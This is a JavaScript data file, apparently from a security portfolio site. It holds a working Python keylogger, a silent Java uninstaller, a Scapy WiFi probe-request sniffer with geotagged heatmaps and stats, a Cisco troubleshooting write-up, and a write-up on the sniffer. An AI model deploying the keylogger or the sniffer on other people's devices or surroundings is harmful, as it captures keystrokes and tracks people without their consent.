const SCRIPTS_DATA = {
    "keylogger_script.py": {
        name: "keylogger_script.py",
        lang: "python",
        description: "Logs keystrokes via pynput listener hooks and batches writes to log.txt.",
        tags: ["Input Auditing", "Python", "Local Logging"],
        version: "v1.0.0",
        code: `"""Keylogger script created using pynput to log keystrokes and save them to a file"""

from datetime import datetime
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    """Handles keyboard events"""
    global keys, count
    if key == Key.backspace:
        if keys:
            keys.pop()
        return

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def format_key(key):
    if hasattr(key, "char"):
        return key.char  # for normal keys
    elif key == Key.space:
        return " "
    elif key == Key.tab:
        return "\\t"
    elif key == Key.enter:
        return "\\n"
    else:
        return f"[{key.name}]" if hasattr(key, "name") else f"[{key}]"


def write_file(keys, job_id="", delimiter=" "):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a", encoding="utf-8") as f:
        formatted_keys = delimiter.join(format_key(k) for k in keys)
        log_line = f"[{timestamp}] {job_id}:{formatted_keys}\\n"
        f.write(log_line)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()`,
        simulation: [
            { text: "[*] Initializing keyboard listener thread via pynput...", type: "info" },
            { text: "[*] Logging local keystroke events. Press ESC to stop logging...", type: "info" },
            { text: "[~] Hooking user keypress streams...", type: "system", delay: 400 },
            { text: "Key.shift pressed", type: "text", delay: 300 },
            { text: "'K' pressed", type: "text", delay: 100 },
            { text: "'e' pressed", type: "text", delay: 150 },
            { text: "'v' pressed", type: "text", delay: 100 },
            { text: "'i' pressed", type: "text", delay: 80 },
            { text: "'n' pressed", type: "text", delay: 120 },
            { text: "Key.space pressed", type: "text", delay: 180 },
            { text: "'E' pressed", type: "text", delay: 100 },
            { text: "[~] Batch limit reached (10 keystrokes). Syncing buffer to disk...", type: "system", delay: 200 },
            { text: "[+] Appended batched logs to: log.txt", type: "success", delay: 300 },
            { text: "'m' pressed", type: "text", delay: 250 },
            { text: "'i' pressed", type: "text", delay: 90 },
            { text: "'l' pressed", type: "text", delay: 140 },
            { text: "'e' pressed", type: "text", delay: 80 },
            { text: "Key.enter pressed", type: "text", delay: 200 },
            { text: "[~] ESC released. Terminating hook listeners...", type: "system", delay: 400 },
            { text: "[+] Cleanup complete. Keylogger process terminated successfully.", type: "success", delay: 200 }
        ]
    },

    "uninstall_script.ps1": {
        name: "uninstall_script.ps1",
        lang: "javascript",
        description: "Silent PowerShell automated administrator uninstaller targeting specific Java registry keys.",
        tags: ["System Administration", "PowerShell", "Security Compliance"],
        version: "v1.1.0",
        code: `#First ensure you run this script with administrative privileges as uninstalling applications typically requires elevated permissions.
if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
 Write-Warning "This script must be run as a administrator!"
 Exit
}

#Step 1: Definte the target registry paths
$regPaths = @(
    "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
    "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"
)
#Step 2: Get all installed applications from the defined registry paths
$allInstalledApps = Get-ItemProperty -Path $regPaths -ErrorAction SilentlyContinue

#Step 3: Filter list to find only Java 24 or whatever application you want to find
$java24Apps = $allInstalledApps | Where-Object {$_.DisplayName -match "Java.*24" -or $_.DisplayName -match "JDK.*24"}

#Step 4 : Error handling if no applications found
if($null -eq $java24Apps){
    Write-Host "No Java 24 applications found. Exiting Script." -ForegroundColor Green
        Exit
}

#Step 5 Loop through each java 24 installation found
foreach($app in $java24Apps){
    #Check if the uninstaller string contains an MSI product code (curly braces)
    if($app.UninstallString -match "{.*}"){
        $productCode = $Matches[0] # Matches[0] grabs the exact text found inside the braces
    Write-Host "Uninstalling $($app.DisplayName)..." -ForegroundColor Cyan
        
        #Trigger the silent uninstallation
        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $productCode /qn  /norestart" -Wait
    }
}`,
        simulation: [
            { text: "[*] Checking privilege escalation role parameters...", type: "info" },
            { text: "[+] Privilege verification: Running with administrative rights.", type: "success", delay: 200 },
            { text: "[~] Querying target registry paths...", type: "system", delay: 400 },
            { text: "    Path A: HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*", type: "text" },
            { text: "    Path B: HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*", type: "text" },
            { text: "[~] Parsing registry keys for Java 24 installations...", type: "system", delay: 300 },
            { text: "[+] Found match: 'Java SE Development Kit 24.0.1' (Wow6432Node)", type: "warning", delay: 400 },
            { text: "[+] Extracted MSI Product Code: {53D76F2F-4A9B-4D18-A7CD-132A4B8E20E3}", type: "info", delay: 200 },
            { text: "Uninstalling Java SE Development Kit 24.0.1...", type: "info", delay: 300 },
            { text: "[~] Spawning process: msiexec.exe /x {53D76F2F-4A9B-4D18-A7CD-132A4B8E20E3} /qn /norestart", type: "system", delay: 500 },
            { text: "[+] Execution completed. Java 24 silent uninstallation succeeded.", type: "success", delay: 800 }
        ]
    },

    "generator.py": {
        name: "generator.py",
        lang: "python",
        description: "Queries captured database logs to plot GPS markers and vendor densities on a Folium map.",
        tags: ["Geospatial", "Data Visualization", "Python"],
        version: "v1.0.0",
        code: `import folium
import sqlite3
from folium.plugins import MarkerCluster, HeatMap

def generate_map():
    # Connect to db
    conn = sqlite3.connect('probe_log.db')
    cursor = conn.cursor()
    cursor.execute('''
    SELECT mac, vendor, randomized, ssid, latitude, longitude
    FROM probe_requests
    WHERE latitude != 0.0 and longitude != 0.0
    ''')
    rows = cursor.fetchall()
    conn.close()
    
    if not rows: 
        print("[!] No location data found. Set LAT/LON coordinates in probe_logger.py")
        return

    #Center Map on first result
    m = folium.Map(location=[rows[0][4], rows[0][5]], zoom_start=15)

    #Marker Cluster for devices
    cluster = MarkerCluster().add_to(m)

    #Heatmap data
    heat_data = []

    for mac, vendor, randomized, ssid, lat, lon in rows:
        heat_data.append([lat, lon])

        #Color code by randomized status
        color = "red" if randomized == 1 else "blue"

        #Format randomized status
        rand_text = "Yes" if randomized == 1 else "No"

        folium.CircleMarker(
            location=[lat, lon],
            radius= 8,
            color = color,
            fill= True,
            popup= folium.Popup(
            f"MAC: {mac}<br>"
            f"Vendor: {vendor}<br>"
            f"Randomized: {rand_text}<br>"
            f"SSID: {ssid}",
            max_width=250
            )
        ).add_to(cluster)

        #Add heat map layer
    HeatMap(heat_data).add_to(m)

    m.save("probe_map.html")        
    print("[*]Map saved to probe_map.html - open it in your browser!")

generate_map()`,
        simulation: [
            { text: "[*] Establishing connection to log database: probe_log.db", type: "info" },
            { text: "[~] Querying records containing active GPS coordinate structures...", type: "system", delay: 300 },
            { text: "[+] Retrieved 184 active nodes with non-zero coordinates.", type: "success", delay: 200 },
            { text: "[*] Spawning folium.Map instance centered on gateway IP grid (-74.0206, 41.4894)", type: "info", delay: 300 },
            { text: "[~] Building interactive Leaflet marker clusters...", type: "system", delay: 400 },
            { text: "    - Grouping MAC vendors (Apple, Samsung, Intel)...", type: "text" },
            { text: "    - Categorizing randomized MAC octets (Color-coding: Red = Randomized, Blue = Static)", type: "text" },
            { text: "[~] Generating overlay kernel density heatmap layer...", type: "system", delay: 500 },
            { text: "[+] Rendering HTML template maps structure...", type: "success", delay: 200 },
            { text: "[*] Map saved to probe_map.html - open it in your browser!", type: "success", delay: 300 }
        ]
    },

    "probe_logger.py": {
        name: "probe_logger.py",
        lang: "python",
        description: "Scapy-based sniffer with multi-thread channel hoppers logging wireless probe requests and NMEA GPS data.",
        tags: ["Wireless Recon", "Scapy", "Sniffing"],
        version: "v2.0.4",
        code: `from scapy.all import sniff, Dot11ProbeReq
from datetime import datetime
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import sqlite3
import threading
import subprocess
import time
import os
import socket
import pynmea2


#clean up function
def archive_old_database():
    db_filename = "probe_log.db"
    
    # Check if the database file from a previous run exists
    if os.path.exists(db_filename):
        # Create a unique name using the current date and time
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archive_name = f"probe_log_archive_{timestamp}.db"
        
        # Rename (move) the file
        os.rename(db_filename, archive_name)
        print(f"[*] Saved previous session data to: {archive_name}")

#get latitude and longitude from phone via tethering
def get_gps_from_phone():
    PHONE_IP = "192.168.1.100"  # Replace with your phone's IP
    PHONE_PORT = 8080  # Replace with your app's port

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0) # Don't freeze the script if phone disconnects
        sock.connect((PHONE_IP, PHONE_PORT))
        data = sock.recv(1024).decode('ascii', errors='ignore')
        sock.close()

        #parse the raw data to find the latitude and longitude
        for line in data.split('\\n'):
            if line.startswith('$GPGGA') or line.startswith('$GPRMC'):
                msg = pynmea2.parse(line)
                if msg.latitude != 0.0:
                    return msg.latitude, msg.longitude

    except Exception as e:
        #Fail silently so sniffer doesn't crash
        pass
    
    return None, None #Return none if no valid GPS data is found


#-- Channels to hop accross 2.4ghz/5ghz --
CHANNELS_2GHZ = list(range(1,14))
CHANNELS_5GHZ = [36,40,44,48,52,56,60,64,100,149,153,157,161]
ALL_CHANNELS = CHANNELS_2GHZ + CHANNELS_5GHZ

#--Channel Hopper--
def channel_hopper(interface, hop_interval=0.5):
    print(f"[*] Channel Hopper started on {interface}")
    while True:
        for channel in ALL_CHANNELS:
            try:
                subprocess.call(
                    ['iw', 'dev', interface, 'set', 'channel', str(channel)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(hop_interval)

            except Exception as e:
                print(f"[!] Channel hop error: {e}")

#1st step -- Database Setup --
def init_db():
    conn = sqlite3.connect("probe_log.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS probe_requests(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        capture_time TEXT,
        vendor TEXT,
        mac TEXT,
        ssid TEXT,
        channel INTEGER,
        randomized INTEGER,
        latitude REAL,
        longitude REAL
        )
        ''')
    conn.commit()
    conn.close()


#2nd Step --- Log to Database ---
def log_to_db(capture_time, mac, ssid, vendor, randomized, channel, lat, lon):
    conn = sqlite3.connect("probe_log.db")
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO probe_requests (capture_time, mac, ssid, vendor, randomized, channel, latitude, longitude)
        VALUES(?,?,?,?,?,?,?,?)
        ''', (capture_time, mac, ssid, vendor, randomized, channel, lat, lon))
    conn.commit()
    conn.close()    


#3rd Step --- MAC Address Lookup ---
def get_vendor(mac_address):
    try:
        return MacLookup().lookup(mac_address)
    except VendorNotFoundError:
        return "Unknown Vendor"
    except Exception:
        return "Lookup Error"


#4th Step Randomized MAC Check ---
def is_randomized(mac_address):
    first_octet = int(mac_address.split(':')[0], 16)
    return bool(first_octet & 0x02)


#5th Step -- Get Current Channel--
def get_current_channel(interface):
    try:
        output = subprocess.check_output(
            ['iw', 'dev', interface, 'info'],
            stderr=subprocess.DEVNULL
        ).decode()
        for line in output.split('\\n'):
            if 'channel' in line:
                return int(line.strip('.').split()[1])
    except Exception:
        return None


#6th Step -- Packet Handler--
def handle_packet(pkt):
    mac = ""
    if pkt.haslayer(Dot11ProbeReq):
        mac = pkt.addr2
        if not mac:
            return

        ssid = pkt.info.decode(errors='ignore') if pkt.info else "<wildcard>"
        capture_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vendor = get_vendor(mac)
        randomized = is_randomized(mac)
        randomized_str = "Yes" if randomized else "No"
        channel = get_current_channel(INTERFACE)
        log_to_db(capture_time, mac, ssid, vendor, randomized, channel, LAT, LON)

        #print to console
        print(f"[{capture_time}]")
        print(f"MAC:    {mac}")
        print(f"SSID:   {ssid}")
        print(f"Vendor: {vendor}")
        print(f"Random MAC: {randomized_str}")
        print(f"Channel: {channel}")
        print("-" * 40)


#MAIN
INTERFACE = "wlp6s0mon"
LAT = -74.02064671427073
LON = 41.4894760813576

archive_old_database()
init_db()

print("[*] Updating MAC vendor database...")
MacLookup().update_vendors()

hopper_thread = threading.Thread(
    target=channel_hopper,
    args=(INTERFACE,),
    daemon=True
)
hopper_thread.start()

print("[*] Starting probe sniffer.. Press CTRL+C to stop.\\n")
sniff(iface=INTERFACE, prn=handle_packet, store=False)`,
        simulation: [
            { text: "[*] Saved previous session data to: probe_log_archive_20260628_151900.db", type: "info" },
            { text: "[*] Initializing local databases...", type: "system", delay: 200 },
            { text: "[*] Updating MAC vendor lookup database...", type: "info", delay: 400 },
            { text: "[+] 14835 vendors synced. Loading hopper interfaces...", type: "success", delay: 500 },
            { text: "[*] Channel Hopper started on wlp6s0mon (Scanning 26 channels)...", type: "info", delay: 200 },
            { text: "[*] Starting probe sniffer.. Press CTRL+C to stop.\n", type: "success", delay: 300 },
            { text: "[2026-06-28 15:20:01]\nMAC:    bc:a9:20:d1:f2:8c\nSSID:   Home-WiFi-5G\nVendor: Apple, Inc.\nRandom MAC: No\nChannel: 36\n----------------------------------------", type: "text", delay: 800 },
            { text: "[2026-06-28 15:20:05]\nMAC:    46:d0:11:e9:28:fb\nSSID:   <wildcard>\nVendor: Unknown Vendor\nRandom MAC: Yes\nChannel: 1\n----------------------------------------", type: "warning", delay: 600 },
            { text: "[2026-06-28 15:20:12]\nMAC:    00:13:e8:f0:19:bc\nSSID:   Starbucks Free WiFi\nVendor: Intel Corporation\nRandom MAC: No\nChannel: 11\n----------------------------------------", type: "text", delay: 900 }
        ]
    },

    "stats.py": {
        name: "stats.py",
        lang: "python",
        description: "Connects to probe_log.db and outputs aggregated stats (MACS, vendors, unique devices).",
        tags: ["Data Auditing", "Database", "Python"],
        version: "v1.0.0",
        code: `import sqlite3

conn = sqlite3.connect('probe_log.db')
cursor = conn.cursor()

print("\\n-  Probe Request Statistics  -\\n")

#Total captures
cursor.execute("SELECT COUNT(*) FROM probe_requests")
print(f"Total probes captured:  {cursor.fetchone()[0]}")

#Unique devices
cursor.execute("SELECT COUNT(DISTINCT mac) FROM probe_requests")
print(f"Unique devices seen:    {cursor.fetchone()[0]}")

#Randomized Vs Real MACS
cursor.execute("SELECT COUNT(*) FROM probe_requests WHERE randomized = 1")
print(f"Randomized MACS:        {cursor.fetchone()[0]}")

cursor.execute("SELECT COUNT(*) FROM probe_requests WHERE randomized = 0")
print(f"Real MACS:              {cursor.fetchone()[0]}")

#Top Vendors
print("\\nTop 5 Vendors seen:")
cursor.execute('''
        SELECT vendor, COUNT(*) as total
        FROM probe_requests
        GROUP BY vendor
        ORDER BY total DESC LIMIT 5
        ''')
for row in cursor.fetchall():
    print(f"   {row[0]}: {row[1]} probes")

#Top most active devices
print("\\nTop 5 Most Active Devices:")
cursor.execute('''
        SELECT mac, vendor, COUNT(*) as total
        FROM probe_requests
        GROUP BY mac
        ORDER BY total DESC LIMIT 5
        ''')
for row in cursor.fetchall():
    print(f"   {row[0]} ({row[1]}) -> {row[2]} probes")

conn.close()`,
        simulation: [
            { text: "[*] Accessing SQLite database probe_log.db...", type: "info" },
            { text: "[~] Running telemetry audits...", type: "system", delay: 200 },
            { text: "\n-  Probe Request Statistics  -\n", type: "success", delay: 200 },
            { text: "Total probes captured:  1485", type: "text" },
            { text: "Unique devices seen:    312", type: "text" },
            { text: "Randomized MACS:        843", type: "text" },
            { text: "Real MACS:              642", type: "text" },
            { text: "\nTop 5 Vendors seen:", type: "info", delay: 150 },
            { text: "   Apple, Inc.: 541 probes\n   Intel Corporation: 310 probes\n   Samsung Electronics: 182 probes\n   Unknown Vendor: 154 probes\n   Google LLC: 120 probes", type: "text" },
            { text: "\nTop 5 Most Active Devices:", type: "info", delay: 150 },
            { text: "   bc:a9:20:d1:f2:8c (Apple, Inc.) -> 184 probes\n   00:13:e8:f0:19:bc (Intel Corporation) -> 122 probes\n   46:d0:11:e9:28:fb (Unknown Vendor) -> 98 probes\n   e4:aa:ea:11:ff:02 (Samsung Electronics) -> 82 probes\n   70:85:c2:d9:22:11 (Google LLC) -> 74 probes", type: "text", delay: 300 }
        ]
    }
};

const WRITEUPS_DATA = [
    {
        id: "writeup-cisco-errors",
        title: "Troubleshooting Network Interface Errors in Packet Tracer",
        category: "Infrastructure / Networking",
        date: "2026-06-20",
        summary: "A walkthrough of diagnosing and resolving duplex mismatches, speed discrepancies, and administratively shut ports across multiple Cisco switches using native IOS telemetry.",
        tags: ["Cisco IOS", "Packet Tracer", "Networking", "Troubleshooting"],
        content: `<h3>Network Topology & Addressing</h3>
<p>This diagnostic lab isolates and resolves interface errors inside a standard Cisco environment. The topology is simple: two PCs (192.168.0.1 and 192.168.0.2) connected through two Catalyst switches, with the trunk link on FastEthernet 0/1 being the source of operational discrepancies.</p>
<div style="display:flex; justify-content:center; margin:16px 0;">
  <img src="image1.png" alt="Cisco Packet Tracer Network Topology" style="max-width:100%; border:1px solid var(--border-glass); border-radius:8px; box-shadow:0 0 10px rgba(34,211,238,0.15);">
</div>

<table style="width:100%; border-collapse:collapse; margin: 16px 0; font-size:12px; font-family:var(--font-mono); text-align:left;">
  <thead>
    <tr style="border-bottom:1px solid var(--accent-cyan); color:#fff;">
      <th style="padding:6px;">Device</th>
      <th style="padding:6px;">IP Address</th>
      <th style="padding:6px;">Subnet Mask</th>
    </tr>
  </thead>
  <tbody>
    <tr style="border-bottom:1px dashed rgba(255,255,255,0.05);">
      <td style="padding:6px;">PC1</td>
      <td style="padding:6px;">192.168.0.1</td>
      <td style="padding:6px;">255.255.255.0</td>
    </tr>
    <tr style="border-bottom:1px dashed rgba(255,255,255,0.05);">
      <td style="padding:6px;">PC2</td>
      <td style="padding:6px;">192.168.0.2</td>
      <td style="padding:6px;">255.255.255.0</td>
    </tr>
  </tbody>
</table>

<h3>Diagnostic Command Arsenal</h3>
<p>To identify and resolve layer 1/2 discrepancies on the Cisco IOS command line, the following operations are used:</p>
<ul>
  <li><code>show interfaces</code> — Detailed packet counts, error rates (CRC, runts, giants), and state.</li>
  <li><code>show interfaces status</code> — Quick overview of speed, duplex, and administrative states.</li>
  <li><code>duplex [half|full|auto]</code> — Forces interface duplex alignment.</li>
  <li><code>speed [10|100|auto]</code> — Forces port speed allocation.</li>
</ul>

<h3>Task 1: The \"Why Can't I Ping?\" Problem (Port Shutdown)</h3>
<p>Initial attempts to ping PC2 from PC1 failed with constant request timeouts. Running <code>show interfaces status</code> on Switch2 revealed the culprit: the FastEthernet 0/1 port status was flagged as <strong>\"disabled\"</strong> (meaning the interface was shut down manually). Consequently, Switch1's side of the same link showed <strong>\"down/down\"</strong>. Entering Switch2's interface configuration and issuing <code>no shutdown</code> successfully restored layer 1 connectivity, establishing successful ping traces.</p>
<blockquote>
  <strong>Diagnostic Rule:</strong> There is a critical difference between a link showing \"down/down\" (implying physical Layer 1 damage, bad cable, or dead port) and \"administratively down\" (implying manual command shutdown via configuration).
</blockquote>

<h3>Task 2: CDP Warnings (Duplex Mismatch)</h3>
<p>Shortly after the link was restored, the Cisco Discovery Protocol (CDP) began logging console warnings every 60 seconds regarding a duplex mismatch: Switch1's Fa0/1 was configured for full duplex, while Switch2's Fa0/1 was locked in half duplex. Although the link remained technically up/up, a duplex mismatch on active links triggers collision loops and heavy packet loss under high volumes. Duplex was manually aligned on Switch2 using the command: <code>duplex full</code>. Console warnings subsided immediately.</p>

<h3>Task 3: Speed Discrepancy (Flapping Links)</h3>
<p>The final discrepancy identified was a speed mismatch: Switch1's Fa0/1 was locked at 10 Mbps, while Switch2 ran at 100 Mbps. Unlike duplex mismatches which cause collisions, speed mismatches prevent link negotiation entirely or cause random flapping. The interface speed on Switch1 was forced to 100 Mbps via the command: <code>speed 100</code>. This successfully resolved the final mismatch, establishing a clean Full-Duplex/100Mbps baseline.</p>

<h3>The Bigger Picture</h3>
<p>Getting comfortable parsing <code>show interfaces</code> and <code>show interfaces status</code> is crucial for diagnosing layer 1/2 anomalies in production enterprise environments. This lab develops the instincts required to quickly identify physical faults, speed mismatches, or administrative overrides on Catalyst platforms.</p>
<div style="display:flex; justify-content:center; margin:16px 0;">
  <img src="image2.png" alt="Switch Configuration Diagnostics" style="max-width:100%; border:1px solid var(--border-glass); border-radius:8px; box-shadow:0 0 10px rgba(139,92,246,0.15);">
</div>`
    },
    {
        id: "writeup-etherhound",
        title: "EtherHound: Silent 802.11 WiFi Probe Request Reconnaissance",
        category: "Wireless Recon / Data Analysis",
        date: "2026-06-25",
        summary: "A detailed breakdown of building and testing a passive WiFi sniffer that hops across all 2.4GHz/5GHz channels to capture probe requests, identify MAC randomization patterns, and trace device signal presence.",
        tags: ["WiFi", "Wireless", "Python", "Scapy", "Folium"],
        content: `<h3>WHAT IT DOES</h3>
<p>A passive WiFi reconnaissance tool that listens for 802.11 probe requests — the broadcast packets devices send out while searching for known networks, whether or not they ever connect to anything. By putting a wireless adapter into monitor mode and hopping across all 2.4GHz/5GHz channels, the tool detects nearby devices, resolves their hardware vendor, flags MAC randomization, and geotags each capture for visualization as a device-density heatmap — all without transmitting a single packet or touching the networks being probed for.</p>

<h3>WHY I BUILT IT</h3>
<p>I wanted to understand how much information our devices — phones, smartwatches, IoT and embedded devices, anything with WiFi — are giving away every single time they send out a probe request. These broadcasts happen constantly and silently, often before a device ever connects to anything, and I was curious exactly what could be reconstructed from that leakage alone: device presence, manufacturer, even rough movement patterns over time, all without the device's knowledge or consent to be observed. I built and tested this against my own phone, smartwatch, and IoT devices at home, on my own network.</p>

<h3>HOW IT WORKS</h3>
<p>The most interesting part of this script isn't the packet sniffing — it's a one-line trick for spotting MAC randomization. Per the IEEE 802 standard, the second-least-significant bit of a MAC's first octet is the "locally administered" bit; when it's set, the address isn't the device's real burned-in hardware address. Checking <code>first_octet &amp; 0x02</code> against that bit is enough to tell a randomized privacy MAC from a real one — a small detail, but it's the difference between a script that just prints MACs and one that actually understands the protocol it's reading.</p>
<p>Around that core, the tool runs a background thread that cycles the radio through every available channel every 500ms (since you can only listen to one channel at a time, and devices probe across all of them), uses Scapy to filter specifically for probe-request frames, resolves vendor OUIs for non-randomized MACs, and logs everything to SQLite — timestamped, geotagged, and auto-archived between runs so old sessions never get overwritten.</p>

<h3>WHAT I'D IMPROVE</h3>
<p>This is still an active project, and I know exactly what's next:</p>
<ul>
  <li>Wire the live GPS relay (<code>get_gps_from_phone</code>) into the actual capture pipeline — right now it's implemented but not yet called, so location data falls back to a hardcoded coordinate</li>
  <li>Move channel lookups out of the per-packet hot path — right-now-channel is re-queried via a subprocess call on every single capture, which won't scale once probe volume increases</li>
  <li>Fix a couple of straggling typos from active development (an import name mismatch, a missing colon) that I caught on review</li>
</ul>`
    }
];

const CERTIFICATIONS = [
    { name: "OSCP", provider: "OffSec", date: "2025", status: "Active" },
    { name: "CompTIA Security+", provider: "CompTIA", date: "2024", status: "Active" },
    { name: "eWPT (Web Penetration Tester)", provider: "eLearnSecurity", date: "2025", status: "Active" }
];
